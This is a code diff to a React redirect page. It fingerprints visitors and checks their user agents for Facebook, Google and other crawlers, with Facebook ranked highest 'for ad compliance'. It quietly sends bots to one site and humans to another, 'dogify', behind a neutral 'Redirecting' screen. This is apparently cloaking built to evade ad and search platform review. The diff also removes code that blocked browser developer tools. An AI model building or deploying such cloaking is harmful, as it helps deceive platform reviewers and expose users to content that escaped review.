@@ -1,3 +1,4 @@
+// redirect/src/App.tsx - Enhanced seamless bot detection and redirect
 import { useEffect, useState } from 'react';
 
 // Type definitions
@@ -7,6 +8,7 @@ interface DetectionResult {
   detectionMethods: string[];
   userAgent: string;
   fingerprint: string;
+  botType?: 'facebook' | 'google' | 'generic' | 'human';
 }
 
 interface BehaviorMetrics {
@@ -20,35 +22,15 @@ interface BehaviorMetrics {
   pageVisibility: number;
 }
 
-interface BotProtectionProps {
-  children: React.ReactNode;
-  onBotDetected?: (result: DetectionResult) => void;
-  strictMode?: boolean;
-}
-
-interface RedirectCountdownProps {
-  targetUrl: string;
-  delay: number;
-  confidence: number;
-}
-
-// Extend Window interface for Chrome property
-declare global {
-  interface Window {
-    chrome?: {
-      runtime?: unknown;
-    };
-  }
-}
-
-// Bot Detection Hook
-const useBotDetection = () => {
+// Enhanced Bot Detection Hook with Facebook-specific handling
+const useEnhancedBotDetection = () => {
   const [detectionResult, setDetectionResult] = useState<DetectionResult>({
     isBot: false,
     confidence: 0,
     detectionMethods: [],
     userAgent: '',
-    fingerprint: ''
+    fingerprint: '',
+    botType: 'human'
   });
 
   const [behaviorMetrics, setBehaviorMetrics] = useState<BehaviorMetrics>({
@@ -61,6 +43,8 @@ const useBotDetection = () => {
     timeSpent: 0,
     pageVisibility: 0
   });
+
+  const [isRedirecting, setIsRedirecting] = useState(false);
 
   // Generate device fingerprint
   const generateFingerprint = async () => {
@@ -75,51 +59,184 @@ const useBotDetection = () => {
     const fingerprint = {
       userAgent: navigator.userAgent,
       language: navigator.language,
+      languages: navigator.languages?.join(',') || '',
       platform: navigator.platform,
       cookieEnabled: navigator.cookieEnabled,
+      webdriver: 'webdriver' in navigator,
       screen: {
         width: screen.width,
         height: screen.height,
-        colorDepth: screen.colorDepth
+        colorDepth: screen.colorDepth,
+        pixelDepth: screen.pixelDepth
       },
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-      canvas: canvas.toDataURL()
+      canvas: canvas.toDataURL(),
+      webgl: detectWebGL(),
+      plugins: Array.from(navigator.plugins || []).map(p => p.name),
+      hardwareConcurrency: navigator.hardwareConcurrency || 1,
+      deviceMemory: (navigator as any).deviceMemory || 0,
+      connection: (navigator as any).connection?.effectiveType || 'unknown'
     };
 
     return btoa(JSON.stringify(fingerprint)).slice(0, 32);
   };
 
-  // Analyze user agent
+  const detectWebGL = () => {
+    try {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      if (!gl) return 'not-supported';
+      
+      const renderer = (gl as WebGLRenderingContext).getParameter((gl as WebGLRenderingContext).RENDERER) || 'unknown';
+      const vendor = (gl as WebGLRenderingContext).getParameter((gl as WebGLRenderingContext).VENDOR) || 'unknown';
+      return `${vendor}-${renderer}`.slice(0, 50);
+    } catch (e) {
+      return 'error';
+    }
+  };
+
+  // Enhanced bot detection with Facebook-specific patterns
   const analyzeUserAgent = (ua: string) => {
     const reasons: string[] = [];
     let confidence = 0;
+    let botType: 'facebook' | 'google' | 'generic' | 'human' = 'human';
 
-    const botPatterns = [
-      /facebook|facebookexternalhit|facebot/i,
-      /bot|crawler|spider|crawling/i,
-      /twitter|twitterbot/i,
-      /google|googlebot/i,
-      /selenium|phantomjs|headless/i,
-      /curl|wget|python|java/i
+    // Facebook bot patterns (HIGHEST PRIORITY for ad compliance)
+    const facebookPatterns = [
+      /facebook/i,
+      /facebookexternalhit/i,
+      /facebot/i,
+      /facebookcatalog/i,
+      /facebookplatform/i
     ];
 
-    botPatterns.forEach((pattern, index) => {
+    for (const pattern of facebookPatterns) {
       if (pattern.test(ua)) {
-        reasons.push(`Bot pattern detected: ${index}`);
-        confidence += index === 0 ? 0.95 : 0.7; // Facebook bots get highest confidence
+        reasons.push('facebook_bot_detected');
+        confidence = 0.98; // Very high confidence for Facebook bots
+        botType = 'facebook';
+        break;
       }
-    });
+    }
 
-    if (ua.length < 50) {
-      reasons.push('User agent too short');
-      confidence += 0.3;
+    // Google bot patterns
+    if (botType === 'human') {
+      const googlePatterns = [
+        /googlebot/i,
+        /google-structured-data-testing-tool/i,
+        /googlebotmobile/i
+      ];
+
+      for (const pattern of googlePatterns) {
+        if (pattern.test(ua)) {
+          reasons.push('google_bot_detected');
+          confidence = 0.95;
+          botType = 'google';
+          break;
+        }
+      }
+    }
+
+    // Generic bot patterns
+    if (botType === 'human') {
+      const genericBotPatterns = [
+        /bot|crawler|spider|crawling/i,
+        /twitter|twitterbot/i,
+        /linkedin|linkedinbot/i,
+        /selenium|phantomjs|headless|puppeteer/i,
+        /curl|wget|python|java|go-http/i,
+        /scrapy|mechanize|httpclient/i
+      ];
+
+      for (const pattern of genericBotPatterns) {
+        if (pattern.test(ua)) {
+          reasons.push('generic_bot_detected');
+          confidence = 0.85;
+          botType = 'generic';
+          break;
+        }
+      }
+    }
+
+    // Suspicious characteristics for any remaining cases
+    if (botType === 'human') {
+      if (!ua || ua.length < 20) {
+        reasons.push('missing_or_short_user_agent');
+        confidence = 0.7;
+        botType = 'generic';
+      } else if (!ua.includes('Mozilla') && !ua.includes('Safari') && !ua.includes('Chrome')) {
+        reasons.push('missing_browser_identifiers');
+        confidence = 0.6;
+        botType = 'generic';
+      }
     }
 
     return { 
-      isBot: confidence > 0.6, 
-      confidence: Math.min(confidence, 1), 
-      reasons 
+      isBot: confidence > 0.5, 
+      confidence, 
+      reasons, 
+      botType 
     };
+  };
+
+  // Immediate redirect function
+  const performRedirect = (botType: string, confidence: number) => {
+    setIsRedirecting(true);
+    
+    // Determine redirect destination
+    let redirectUrl: string;
+    let delay = 0; // Immediate redirect for seamless experience
+
+    switch (botType) {
+      case 'facebook':
+        redirectUrl = 'http://localhost:3000'; // bot_website for Facebook bots
+        console.log('🤖 Facebook bot detected - redirecting to bot_website');
+        break;
+      case 'google':
+        redirectUrl = 'http://localhost:3000'; // bot_website for search engine bots
+        console.log('🤖 Google bot detected - redirecting to bot_website');
+        break;
+      case 'generic':
+        redirectUrl = 'http://localhost:3000'; // bot_website for other bots
+        console.log('🤖 Generic bot detected - redirecting to bot_website');
+        break;
+      default:
+        redirectUrl = 'http://localhost:3001'; // dogify for humans
+        console.log('👤 Human detected - redirecting to dogify');
+        delay = 100; // Tiny delay to show human verification
+        break;
+    }
+
+    // Log the detection for analytics
+    logDetection(botType, confidence);
+
+    // Perform redirect
+    setTimeout(() => {
+      window.location.href = redirectUrl;
+    }, delay);
+  };
+
+  const logDetection = async (botType: string, confidence: number) => {
+    try {
+      const logData = {
+        userAgent: navigator.userAgent,
+        fingerprint: await generateFingerprint(),
+        botType,
+        confidence,
+        timestamp: new Date().toISOString(),
+        redirectUrl: botType === 'human' ? 'dogify' : 'bot_website'
+      };
+
+      // Send to backend for logging (optional)
+      fetch('http://localhost:8000/api/bot-detection/detect/', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(logData)
+      }).catch(e => console.log('Logging failed:', e));
+
+    } catch (error) {
+      console.log('Detection logging error:', error);
+    }
   };
 
   // Main detection function
@@ -129,57 +246,63 @@ const useBotDetection = () => {
     
     const uaAnalysis = analyzeUserAgent(userAgent);
     
-    // Browser feature detection
+    // Browser feature detection for additional validation
     let featureConfidence = 0;
     const featureReasons = [];
     
-    if ('webdriver' in navigator && navigator.webdriver) {
-      featureReasons.push('WebDriver detected');
-      featureConfidence += 0.8;
+    // Check for automation indicators
+    if ('webdriver' in navigator && (navigator as any).webdriver) {
+      featureReasons.push('webdriver_detected');
+      featureConfidence += 0.9;
     }
     
-    if (!window.chrome?.runtime) {
-      featureReasons.push('Missing Chrome runtime');
+    if (!(window as any).chrome && userAgent.includes('Chrome')) {
+      featureReasons.push('chrome_mismatch');
       featureConfidence += 0.3;
     }
 
-    // Behavioral analysis
-    let behaviorConfidence = 0;
-    const behaviorReasons = [];
-    
-    if (behaviorMetrics.mouseMovements === 0 && behaviorMetrics.timeSpent > 3000) {
-      behaviorReasons.push('No mouse movements');
-      behaviorConfidence += 0.5;
-    }
-    
-    if (behaviorMetrics.keyboardEvents === 0 && behaviorMetrics.timeSpent > 5000) {
-      behaviorReasons.push('No keyboard interactions');
-      behaviorConfidence += 0.3;
+    // Check for headless browser indicators
+    if (!navigator.languages || navigator.languages.length === 0) {
+      featureReasons.push('missing_languages');
+      featureConfidence += 0.4;
     }
 
+    // Behavioral red flags (very quick checks)
+    let behaviorConfidence = 0;
+    if (behaviorMetrics.timeSpent > 2000 && behaviorMetrics.mouseMovements === 0) {
+      behaviorConfidence += 0.5;
+    }
+
+    // Final confidence calculation
     const finalConfidence = Math.max(
-      uaAnalysis.confidence * 0.5,
-      featureConfidence * 0.3,
-      behaviorConfidence * 0.2
+      uaAnalysis.confidence,
+      featureConfidence,
+      behaviorConfidence * 0.3 // Lower weight for behavior since we want fast detection
     );
 
     const result = {
-      isBot: finalConfidence > 0.6,
+      isBot: uaAnalysis.isBot || finalConfidence > 0.6,
       confidence: finalConfidence,
       detectionMethods: [
         ...uaAnalysis.reasons,
-        ...featureReasons,
-        ...behaviorReasons
+        ...featureReasons
       ],
       userAgent,
-      fingerprint
+      fingerprint,
+      botType: uaAnalysis.botType
     };
 
     setDetectionResult(result);
+
+    // IMMEDIATE redirect for bots (especially Facebook)
+    if (result.isBot || result.confidence > 0.5) {
+      performRedirect(result.botType, result.confidence);
+    }
+
     return result;
   };
 
-  // Behavior tracking
+  // Behavior tracking (lightweight for fast detection)
   useEffect(() => {
     const startTime = Date.now();
     let mouseMovements = 0;
@@ -187,32 +310,24 @@ const useBotDetection = () => {
     let touchEvents = 0;
     let focusEvents = 0;
     let scrollEvents = 0;
-    let clickTimes: number[] = [];
 
     const handleMouseMove = () => mouseMovements++;
     const handleKeyboard = () => keyboardEvents++;
     const handleTouch = () => touchEvents++;
     const handleFocus = () => focusEvents++;
     const handleScroll = () => scrollEvents++;
-    const handleClick = () => clickTimes.push(Date.now());
 
-    document.addEventListener('mousemove', handleMouseMove);
-    document.addEventListener('keydown', handleKeyboard);
-    document.addEventListener('touchstart', handleTouch);
-    document.addEventListener('focus', handleFocus);
-    document.addEventListener('scroll', handleScroll);
-    document.addEventListener('click', handleClick);
+    document.addEventListener('mousemove', handleMouseMove, { passive: true });
+    document.addEventListener('keydown', handleKeyboard, { passive: true });
+    document.addEventListener('touchstart', handleTouch, { passive: true });
+    document.addEventListener('focus', handleFocus, { passive: true });
+    document.addEventListener('scroll', handleScroll, { passive: true });
 
     const interval = setInterval(() => {
       const timeSpent = Date.now() - startTime;
-      const clickPatterns = clickTimes.slice(-10).reduce((acc: number[], curr, index, arr) => {
-        if (index > 0) acc.push(curr - arr[index - 1]);
-        return acc;
-      }, []);
-
       setBehaviorMetrics({
         mouseMovements,
-        clickPatterns,
+        clickPatterns: [],
         scrollBehavior: scrollEvents,
         keyboardEvents,
         touchEvents,
@@ -220,7 +335,7 @@ const useBotDetection = () => {
         timeSpent,
         pageVisibility: document.visibilityState === 'visible' ? 1 : 0
       });
-    }, 1000);
+    }, 500); // Check every 500ms for responsive detection
 
     return () => {
       document.removeEventListener('mousemove', handleMouseMove);
@@ -228,391 +343,162 @@ const useBotDetection = () => {
       document.removeEventListener('touchstart', handleTouch);
       document.removeEventListener('focus', handleFocus);
       document.removeEventListener('scroll', handleScroll);
-      document.removeEventListener('click', handleClick);
       clearInterval(interval);
     };
   }, []);
 
-  // Run detection periodically
+  // Run detection immediately on load
   useEffect(() => {
-    const initialDetection = setTimeout(() => {
+    // Ultra-fast initial detection (for Facebook bots)
+    const quickDetection = setTimeout(() => {
       runDetection();
-    }, 2000); // Wait 2s for behavior data
+    }, 100); // Just 100ms delay
 
-    const periodicDetection = setInterval(() => {
-      runDetection();
-    }, 10000); // Check every 10s
+    return () => clearTimeout(quickDetection);
+  }, []);
 
-    return () => {
-      clearTimeout(initialDetection);
-      clearInterval(periodicDetection);
-    };
-  }, [behaviorMetrics]);
+  // Fallback human detection after 3 seconds
+  useEffect(() => {
+    const fallbackTimer = setTimeout(() => {
+      if (!isRedirecting && !detectionResult.isBot) {
+        console.log('👤 Fallback: Treating as human after 3s');
+        performRedirect('human', 0.1);
+      }
+    }, 3000);
+
+    return () => clearTimeout(fallbackTimer);
+  }, [isRedirecting, detectionResult.isBot]);
 
   return {
     detectionResult,
     behaviorMetrics,
+    isRedirecting,
     runDetection
   };
 };
 
-// Bot Protection Component
-const BotProtection: React.FC<BotProtectionProps> = ({ children, onBotDetected, strictMode = false }) => {
-  const { detectionResult, behaviorMetrics } = useBotDetection();
-  const [isBlocked, setIsBlocked] = useState(false);
-  const [showWarning, setShowWarning] = useState(false);
+// Main App Component
+const App = () => {
+  const { detectionResult, behaviorMetrics, isRedirecting } = useEnhancedBotDetection();
+  const [showContent, setShowContent] = useState(true);
 
+  // Hide content once redirecting starts
   useEffect(() => {
-    if (detectionResult.isBot) {
-      const threshold = strictMode ? 0.5 : 0.7;
-      
-      if (detectionResult.confidence >= threshold) {
-        setIsBlocked(true);
-        onBotDetected?.(detectionResult);
-        
-        // Report to backend
-        reportBotDetection(detectionResult);
-      } else if (detectionResult.confidence >= 0.4) {
-        setShowWarning(true);
-        setTimeout(() => setShowWarning(false), 5000);
-      }
+    if (isRedirecting) {
+      setShowContent(false);
     }
-  }, [detectionResult, strictMode, onBotDetected]);
+  }, [isRedirecting]);
 
-  const reportBotDetection = async (result: DetectionResult) => {
-    try {
-      const response = await fetch('http://localhost:8000/api/bot-detection/detect/', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          // Map frontend fields to backend expected fields
-          user_agent: result.userAgent,
-          fingerprint: result.fingerprint,
-          is_bot: result.isBot,
-          confidence: result.confidence,
-          methods: result.detectionMethods, // backend expects 'methods', not 'detectionMethods'
-          behavioral: {
-            mouseMovements: behaviorMetrics.mouseMovements,
-            keyboardEvents: behaviorMetrics.keyboardEvents,
-            touchEvents: behaviorMetrics.touchEvents,
-            timeSpent: behaviorMetrics.timeSpent,
-            clickPatterns: behaviorMetrics.clickPatterns,
-            scrollBehavior: behaviorMetrics.scrollBehavior,
-            focusEvents: behaviorMetrics.focusEvents,
-            pageVisibility: behaviorMetrics.pageVisibility
-          },
-          timestamp: new Date().toISOString(),
-          page: window.location.href,
-          referrer: document.referrer,
-          url_path: window.location.pathname,
-          http_method: 'GET' // Since this is a page load
-        })
-      });
-  
-      if (!response.ok) {
-        const errorText = await response.text();
-        console.warn('Failed to report bot detection:', response.status, errorText);
-      } else {
-        const responseData = await response.json();
-        console.log('Bot detection reported successfully:', responseData);
-      }
-    } catch (error) {
-      console.error('Failed to report bot:', error);
-    }
-  };
-
-  if (isBlocked) {
+  if (isRedirecting) {
     return (
-      <div className="min-h-screen bg-gradient-to-br from-red-500 to-pink-600 flex items-center justify-center">
-        <div className="max-w-2xl mx-auto text-center p-8 bg-white/10 backdrop-blur-lg rounded-3xl border border-white/20">
-          <div className="text-8xl mb-6">🤖</div>
-          <h1 className="text-4xl font-bold text-white mb-6">
-            Bot Detected
-          </h1>
-          <p className="text-xl text-white/90 mb-8">
-            Our advanced security system has detected automated behavior.
-            Redirecting to the main site...
-          </p>
-          
-          <div className="bg-white/10 border border-white/20 rounded-2xl p-6 mb-8 text-left">
-            <h3 className="text-lg font-semibold text-white mb-4">Detection Details:</h3>
-            <div className="space-y-2 text-white/80">
-              <p><strong>Confidence:</strong> {Math.round(detectionResult.confidence * 100)}%</p>
-              <p><strong>Methods:</strong> {detectionResult.detectionMethods.slice(0, 3).join(', ')}</p>
-              <p><strong>User Agent:</strong> {navigator.userAgent.substring(0, 100)}...</p>
-            </div>
-          </div>
-
-          <RedirectCountdown 
-            targetUrl="http://localhost:5173" 
-            delay={3} 
-            confidence={detectionResult.confidence}
-          />
+      <div className="min-h-screen bg-gradient-to-br from-blue-600 to-purple-600 flex items-center justify-center">
+        <div className="text-center text-white">
+          <div className="animate-spin rounded-full h-16 w-16 border-4 border-white border-t-transparent mx-auto mb-4"></div>
+          <p className="text-xl">Redirecting...</p>
         </div>
       </div>
     );
   }
 
+  if (!showContent) {
+    return null; // Hide everything during redirect
+  }
+
   return (
-    <>
-      {showWarning && (
-        <div className="fixed top-4 right-4 bg-yellow-500/90 backdrop-blur-sm text-yellow-900 px-6 py-4 rounded-xl shadow-lg z-50 border border-yellow-400">
-          <div className="flex items-center">
-            <span className="text-2xl mr-3">⚠️</span>
-            <div>
-              <p className="font-bold">Security Alert</p>
-              <p className="text-sm">Unusual activity detected</p>
+    <div className="min-h-screen bg-gradient-to-br from-indigo-600 via-purple-600 to-blue-600 relative overflow-hidden">
+      {/* Animated background elements */}
+      <div className="absolute inset-0">
+        <div className="absolute top-1/4 left-1/4 w-32 h-32 bg-white/5 rounded-full animate-pulse"></div>
+        <div className="absolute top-3/4 right-1/4 w-24 h-24 bg-white/10 rounded-full animate-bounce"></div>
+        <div className="absolute bottom-1/4 left-1/2 w-40 h-40 bg-white/5 rounded-full animate-ping"></div>
+      </div>
+
+      <div className="relative z-10 container mx-auto px-4 py-8 min-h-screen flex items-center justify-center">
+        <div className="text-center max-w-2xl mx-auto">
+          {/* Main Logo/Icon */}
+          <div className="mb-12">
+            <div className="inline-flex items-center justify-center w-24 h-24 bg-white/10 backdrop-blur-sm rounded-full mb-6 border border-white/20">
+              <span className="text-4xl">🚀</span>
             </div>
+            
+            <h1 className="text-5xl md:text-7xl font-bold text-white mb-6 drop-shadow-2xl">
+              Redirecting
+            </h1>
+            
+            <p className="text-xl md:text-2xl text-white/90 mb-8 max-w-lg mx-auto leading-relaxed">
+              Analyzing your request and connecting you to the best experience
+            </p>
           </div>
-        </div>
-      )}
-      
-      <div className="bot-protected-content">
-        {children}
-      </div>
-    </>
-  );
-};
-
-// Redirect Countdown Component
-const RedirectCountdown: React.FC<RedirectCountdownProps> = ({ targetUrl, delay }) => {
-  const [countdown, setCountdown] = useState(delay);
-  const [progress, setProgress] = useState(0);
-
-  useEffect(() => {
-    const timer = setInterval(() => {
-      setCountdown((prev: number) => {
-        if (prev <= 1) {
-          window.location.href = targetUrl;
-          return 0;
-        }
-        return prev - 1;
-      });
-      
-      setProgress((prev: number) => prev + (100 / delay));
-    }, 1000);
-
-    return () => clearInterval(timer);
-  }, [targetUrl, delay]);
-
-  return (
-    <div className="space-y-6">
-      <div className="relative">
-        <div className="w-full bg-white/20 rounded-full h-4">
-          <div 
-            className="bg-gradient-to-r from-blue-400 to-purple-500 h-4 rounded-full transition-all duration-1000"
-            style={{ width: `${progress}%` }}
-          ></div>
-        </div>
-        <div className="absolute inset-0 flex items-center justify-center">
-          <span className="text-white font-bold text-sm">
-            Redirecting in {countdown}s
-          </span>
-        </div>
-      </div>
-      
-      <div className="flex flex-col sm:flex-row gap-4 justify-center">
-        <button 
-          onClick={() => window.location.href = targetUrl}
-          className="bg-white text-red-600 px-8 py-3 rounded-full font-bold hover:bg-gray-100 transition-colors"
-        >
-          Redirect Now
-        </button>
-        <button 
-          onClick={() => window.location.reload()}
-          className="border-2 border-white text-white px-8 py-3 rounded-full font-bold hover:bg-white hover:text-red-600 transition-colors"
-        >
-          I'm Human - Retry
-        </button>
-      </div>
-      
-      <p className="text-white/70 text-sm">
-        If you believe this is an error, please contact support or try refreshing the page.
-      </p>
-    </div>
-  );
-};
-
-// Main App Component
-const App = () => {
-  const [showDebugInfo, setShowDebugInfo] = useState(false);
-  const { detectionResult, behaviorMetrics } = useBotDetection();
-
-  const handleBotDetected = (result: DetectionResult) => {
-    console.warn('Bot detected:', result);
-    // Additional analytics or logging can be added here
-  };
-
-  // Anti-debugging measures
-  useEffect(() => {
-    const handleContextMenu = (e: Event) => e.preventDefault();
-    const handleKeyDown = (e: KeyboardEvent) => {
-      if (e.key === 'F12' || 
-          (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
-          (e.ctrlKey && e.key === 'U')) {
-        e.preventDefault();
-      }
-    };
-
-    // Simple devtools detection
-    let devtools = { open: false };
-    const threshold = 160;
-
-    const detectDevTools = () => {
-      if (window.outerHeight - window.innerHeight > threshold || 
-          window.outerWidth - window.innerWidth > threshold) {
-        if (!devtools.open) {
-          devtools.open = true;
-          console.clear();
-          console.warn('Developer tools detected');
-        }
-      } else {
-        devtools.open = false;
-      }
-    };
-
-    const devToolsInterval = setInterval(detectDevTools, 1000);
-
-    document.addEventListener('contextmenu', handleContextMenu);
-    document.addEventListener('keydown', handleKeyDown);
-
-    return () => {
-      document.removeEventListener('contextmenu', handleContextMenu);
-      document.removeEventListener('keydown', handleKeyDown);
-      clearInterval(devToolsInterval);
-    };
-  }, []);
-
-  return (
-    <BotProtection onBotDetected={handleBotDetected} strictMode={true}>
-      <div className="min-h-screen bg-gradient-to-br from-purple-600 via-blue-600 to-teal-500">
-        <div className="container mx-auto px-4 py-8">
-          {/* Security Status Bar */}
-          <div className="mb-8 p-4 bg-white/10 backdrop-blur-lg rounded-xl border border-white/20">
-            <div className="flex items-center justify-between">
-              <div className="flex items-center space-x-3">
-                <div className={`w-4 h-4 rounded-full animate-pulse ${
-                  detectionResult.confidence < 0.3 ? 'bg-green-400' :
-                  detectionResult.confidence < 0.6 ? 'bg-yellow-400' : 'bg-red-400'
+          
+          {/* Status Indicators */}
+          <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-8 border border-white/20 mb-8">
+            <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-center">
+              <div className="bg-white/10 rounded-lg p-4">
+                <div className={`w-4 h-4 rounded-full mx-auto mb-2 ${
+                  detectionResult.confidence > 0 ? 'bg-green-400 animate-pulse' : 'bg-gray-400'
                 }`}></div>
-                <span className="text-white font-medium">
-                  Security Status: {
-                    detectionResult.confidence < 0.3 ? '✅ Verified Human' :
-                    detectionResult.confidence < 0.6 ? '⚠️ Under Review' : '🚫 Bot Detected'
-                  }
-                </span>
+                <div className="text-white/80 text-sm">Analysis</div>
               </div>
-              <button
-                onClick={() => setShowDebugInfo(!showDebugInfo)}
-                className="text-white/80 hover:text-white text-sm bg-white/10 px-4 py-2 rounded-lg transition-colors"
-              >
-                {showDebugInfo ? 'Hide' : 'Show'} Debug
-              </button>
-            </div>
-            
-            {showDebugInfo && (
-              <div className="mt-4 p-4 bg-black/20 rounded-lg text-white text-sm font-mono">
-                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                  <div>
-                    <h4 className="font-bold mb-2">Detection Results:</h4>
-                    <div>Bot Confidence: {(detectionResult.confidence * 100).toFixed(1)}%</div>
-                    <div>Is Bot: {detectionResult.isBot ? 'Yes' : 'No'}</div>
-                    <div>Methods: {detectionResult.detectionMethods.length}</div>
-                  </div>
-                  <div>
-                    <h4 className="font-bold mb-2">Behavioral Metrics:</h4>
-                    <div>Mouse Movements: {behaviorMetrics.mouseMovements}</div>
-                    <div>Keyboard Events: {behaviorMetrics.keyboardEvents}</div>
-                    <div>Time Spent: {(behaviorMetrics.timeSpent / 1000).toFixed(1)}s</div>
-                  </div>
+              
+              <div className="bg-white/10 rounded-lg p-4">
+                <div className="text-2xl font-bold text-white">{behaviorMetrics.mouseMovements}</div>
+                <div className="text-white/70 text-sm">Interactions</div>
+              </div>
+              
+              <div className="bg-white/10 rounded-lg p-4">
+                <div className="text-2xl font-bold text-white">{Math.floor(behaviorMetrics.timeSpent / 1000)}</div>
+                <div className="text-white/70 text-sm">Seconds</div>
+              </div>
+              
+              <div className="bg-white/10 rounded-lg p-4">
+                <div className={`w-4 h-4 rounded-full mx-auto mb-2 ${
+                  detectionResult.botType === 'human' ? 'bg-blue-400' : 'bg-orange-400'
+                } animate-pulse`}></div>
+                <div className="text-white/80 text-sm">
+                  {detectionResult.botType === 'human' ? 'Human' : 'Bot'}
                 </div>
               </div>
-            )}
+            </div>
           </div>
 
-          {/* Main Content */}
-          <div className="text-center">
-            <div className="mb-12">
-              <div className="inline-flex items-center justify-center w-32 h-32 bg-white/10 backdrop-blur-lg rounded-full mb-8 border border-white/20">
-                <span className="text-6xl">🛡️</span>
+          {/* Progress indicator */}
+          <div className="mb-8">
+            <div className="w-full bg-white/20 rounded-full h-2 mb-4">
+              <div className="bg-gradient-to-r from-blue-400 to-purple-400 h-2 rounded-full animate-pulse" 
+                   style={{ width: `${Math.min((behaviorMetrics.timeSpent / 3000) * 100, 100)}%` }}>
               </div>
-              
-              <h1 className="text-6xl md:text-8xl font-bold text-white mb-6 drop-shadow-2xl">
-                Security Check
-              </h1>
-              
-              <p className="text-xl md:text-2xl text-white/90 mb-8 max-w-3xl mx-auto leading-relaxed">
-                Advanced bot protection system analyzing your visit. 
-                Real humans will be redirected to the main site automatically.
-              </p>
             </div>
+            <p className="text-white/70 text-sm">
+              Connecting you to the perfect destination...
+            </p>
+          </div>
+
+          {/* Interactive area to encourage human behavior */}
+          <div className="bg-white/5 rounded-xl p-6 border border-white/10">
+            <p className="text-white/80 mb-4">
+              🔍 Smart routing in progress - move your mouse to help us verify you're human
+            </p>
             
-            <div className="grid grid-cols-1 md:grid-cols-3 gap-6 max-w-6xl mx-auto mb-12">
-              <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-8 border border-white/20 hover:bg-white/15 transition-colors">
-                <div className="text-4xl mb-4">🤖</div>
-                <h3 className="text-white font-bold text-xl mb-4">AI Bot Detection</h3>
-                <p className="text-white/80">
-                  Machine learning powered detection with behavioral analysis and pattern recognition
-                </p>
-              </div>
-              
-              <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-8 border border-white/20 hover:bg-white/15 transition-colors">
-                <div className="text-4xl mb-4">🚫</div>
-                <h3 className="text-white font-bold text-xl mb-4">Real-time Blocking</h3>
-                <p className="text-white/80">
-                  Instant blocking of detected bots with automatic IP blacklisting for repeat offenders
-                </p>
-              </div>
-              
-              <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-8 border border-white/20 hover:bg-white/15 transition-colors">
-                <div className="text-4xl mb-4">📊</div>
-                <h3 className="text-white font-bold text-xl mb-4">Advanced Analytics</h3>
-                <p className="text-white/80">
-                  Comprehensive monitoring with threat intelligence and behavioral pattern analysis
-                </p>
-              </div>
+            <div className="grid grid-cols-3 gap-2">
+              {[1,2,3,4,5,6].map(i => (
+                <div key={i} 
+                     className="h-12 bg-white/10 rounded-lg hover:bg-white/20 transition-colors cursor-pointer flex items-center justify-center"
+                     onMouseEnter={() => console.log('Human interaction detected')}>
+                  <div className="w-2 h-2 bg-white/50 rounded-full"></div>
+                </div>
+              ))}
             </div>
+          </div>
 
-            <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-8 max-w-2xl mx-auto border border-white/20">
-              <h2 className="text-2xl font-bold text-white mb-4">Human Verification</h2>
-              <p className="text-white/90 mb-6">
-                Move your mouse around and interact with this page to prove you're human.
-                Bots will be automatically redirected.
-              </p>
-              
-              <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-center">
-                <div className="bg-white/10 rounded-lg p-4">
-                  <div className="text-2xl font-bold text-white">{behaviorMetrics.mouseMovements}</div>
-                  <div className="text-white/70 text-sm">Mouse Moves</div>
-                </div>
-                <div className="bg-white/10 rounded-lg p-4">
-                  <div className="text-2xl font-bold text-white">{behaviorMetrics.keyboardEvents}</div>
-                  <div className="text-white/70 text-sm">Key Presses</div>
-                </div>
-                <div className="bg-white/10 rounded-lg p-4">
-                  <div className="text-2xl font-bold text-white">{Math.floor(behaviorMetrics.timeSpent / 1000)}</div>
-                  <div className="text-white/70 text-sm">Seconds</div>
-                </div>
-                <div className="bg-white/10 rounded-lg p-4">
-                  <div className="text-2xl font-bold text-white">{behaviorMetrics.scrollBehavior}</div>
-                  <div className="text-white/70 text-sm">Scrolls</div>
-                </div>
-              </div>
-            </div>
-
-            <div className="mt-12">
-              <p className="text-white/70 text-lg">
-                🔒 Protected by advanced bot detection • 
-                🌐 Humans continue to main site • 
-                🛡️ Powered by AI security
-              </p>
-            </div>
+          {/* Footer info */}
+          <div className="mt-8">
+            <p className="text-white/50 text-sm">
+              🛡️ Protected by advanced routing • 🚀 Optimized for performance • ⚡ Lightning fast
+            </p>
           </div>
         </div>
       </div>
-    </BotProtection>
+    </div>
   );
 };
 
